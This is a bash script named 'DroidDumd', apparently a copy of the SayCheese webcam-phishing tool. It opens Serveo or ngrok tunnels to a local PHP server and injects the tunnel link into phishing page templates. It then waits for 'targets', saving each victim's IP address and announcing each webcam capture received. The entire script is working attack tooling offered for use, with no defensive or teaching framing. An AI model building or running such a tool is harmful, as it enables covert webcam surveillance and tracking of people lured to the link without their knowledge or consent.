#!/bin/bash
# DroidDumd v2.1
# coded by: github.com/Mrdevilindo/Droidumd
# If you use any part of this code, please give credits. Read the License!

set -e  # Exit immediately if a command exits with a non-zero status.
trap 'cleanup' SIGINT  # Trap Ctrl+C for cleanup

# Function to display a banner
banner() {
    cat << "EOF"
  ____       ____        U  ___ u                 ____      ____       _   _    __  __     ____    
 |  _"\   U |  _"\ u      \/"_ \/      ___       |  _"\    |  _"\   U |"|u| | U|' \/ '|u  |  _"\   
/| | | |   \| |_) |/      | | | |     |_"_|     /| | | |  /| | | |   \| |\| | \| |\/| |/ /| | | |  
U| |_| |\   |  _ <    .-,_| |_| |      | |      U| |_| |\ U| |_| |\   | |_| |  | |  | |  U| |_| |\ 
 |____/ u   |_| \_\    \_)-\___/     U/| |\u     |____/ u  |____/ u  <<\___/   |_|  |_|   |____/ u 
  |||_      //   \\_        \\    .-,_|___|_,-.   |||_      |||_    (__) )(   <<,-,,-.     |||_    
 (__)_)    (__)  (__)      (__)    \_)-' '-(_/   (__)_)    (__)_)       (__)   (./  \.)   (__)_)

EOF
    printf " \e[1;77m v2.1 coded by github.com/Mrdevilindo/Droidumd\e[0m \n"
    printf "\n"
}

# Cleanup function to kill background processes
cleanup() {
    printf "\nStopping services...\n"
    pkill -f ngrok || true
    pkill -f php || true
    pkill -f ssh || true
    exit 1
}

# Check if required dependencies are installed
check_dependencies() {
    local dependencies=("php" "ssh" "unzip" "wget" "curl")
    for cmd in "${dependencies[@]}"; do
        command -v "$cmd" > /dev/null 2>&1 || { echo >&2 "I require $cmd but it's not installed. Please install it. Aborting."; exit 1; }
    done
}

# Function to catch IP addresses
catch_ip() {
    if [[ -f ip.txt ]]; then
        local ip
        ip=$(awk '/IP:/{print $2}' ip.txt)
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
        cat ip.txt >> saved.ip.txt
        rm -f ip.txt
    fi
}

# Function to monitor for incoming connections
monitor_connections() {
    printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets, press Ctrl + C to exit...\e[0m\n"
    while true; do
        sleep 1
        catch_ip
        if [[ -f Log.log ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -f Log.log
        fi
    done
}

# Function to start the server using Serveo
start_serveo() {
    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
    if [[ -f sendlink ]]; then rm -f sendlink; fi
    local command="ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net"
    eval "$command > sendlink &"
    sleep 8
    start_php_server
}

# Function to start the PHP server
start_php_server() {
    printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting PHP server... (localhost:3333)\e[0m\n"
    fuser -k 3333/tcp >/dev/null 2>&1 || true
    php -S localhost:3333 >/dev/null 2>&1 &
    sleep 3
    local send_link
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
    update_payload "$send_link"
    monitor_connections
}

# Function to update payload files with the provided link
update_payload() {
    local link="$1"
    sed -i "s+forwarding_link+$link+g" saycheese.html
    sed -i "s+forwarding_link+$link+g" template.php
}

# Function to start ngrok server
start_ngrok() {
    if [[ ! -f ngrok ]]; then
        download_ngrok
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 >/dev/null 2>&1 &
    sleep 10
    local link
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
    update_payload "$link"
    monitor_connections
}

# Function to download ngrok based on architecture
download_ngrok() {
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
    local arch
    arch=$(uname -m)
    if [[ "$arch" == "x86_64" ]]; then
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
        unzip -o ngrok-stable-linux-amd64.zip > /dev/null 2>&1
    elif [[ "$arch" == "arm" ]]; then
        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
        unzip -o ngrok-stable-linux-arm.zip > /dev/null 2>&1
    else
        echo "Unsupported architecture: $arch. Aborting."
        exit 1
    fi
    chmod +x ngrok
    rm -f ngrok-stable-linux-*.zip
}

# Function to initialize the application
initialize_application() {
    local default_choose_sub="Y"
    local default_subdomain="saycheese$RANDOM"
    
    printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
    read -r choose_sub
    choose_sub="${choose_sub:-${default_choose_sub}}"
    
    if [[ "$choose_sub" =~ ^[Yy]|[Yy]es$ ]]; then
        printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' "$default_subdomain"
        read -r subdomain
        subdomain="${subdomain:-${default_subdomain}}"
    fi
}

# Main script execution
banner
check_dependencies
initialize_application

printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m ngrok\e[0m\n"
printf "\n\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose option (1 or 2): \e[0m"
read -r choose_option

case "$choose_option" in
    1)
        start_serveo
        ;;
    2)
        start_ngrok
        ;;
    *)
        printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid option. Please restart the script and choose 1 or 2.\e[0m\n"
        exit 1
        ;;
esac

